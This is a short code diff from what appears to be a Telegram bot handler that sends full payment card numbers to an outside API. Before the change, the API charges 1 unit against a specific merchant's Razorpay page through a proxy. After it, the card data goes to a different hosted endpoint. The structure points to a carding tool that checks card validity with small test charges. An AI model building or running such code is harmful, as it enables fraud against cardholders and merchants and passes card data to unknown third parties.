@@ -2675,12 +2675,7 @@ async def process_rz(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
 
         # --- API request ---
         api_url = (
-            f"http://168.220.237.46:5000/"
-            f"key=rz/"
-            f"proxy=proxy%20laga%20le/"
-            f"site=https://razorpay.me/@hotelparasinternationaldelhi/"
-            f"price=1/"
-            f"cc={full_card}"
+            f"https://rockyrockss.onrender.com/api/razorpay/pay?cc={full_card}"
         )
 
         try:
